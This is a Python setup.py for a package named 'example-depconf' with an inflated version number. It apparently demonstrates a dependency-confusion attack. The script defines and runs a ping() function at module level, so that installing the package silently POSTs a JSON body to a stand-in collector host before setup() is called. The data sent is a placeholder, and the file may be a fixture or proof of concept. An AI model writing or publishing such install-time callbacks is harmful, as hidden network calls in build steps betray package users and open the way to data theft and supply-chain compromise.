import json
import urllib.request
from setuptools import setup


def ping():
    body = json.dumps({"host": "example"}).encode("utf-8")
    req = urllib.request.Request(
        "https://collector.example.invalid/depconf/",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    urllib.request.urlopen(req, timeout=5)


ping()
setup(name="example-depconf", version="99.99.1")
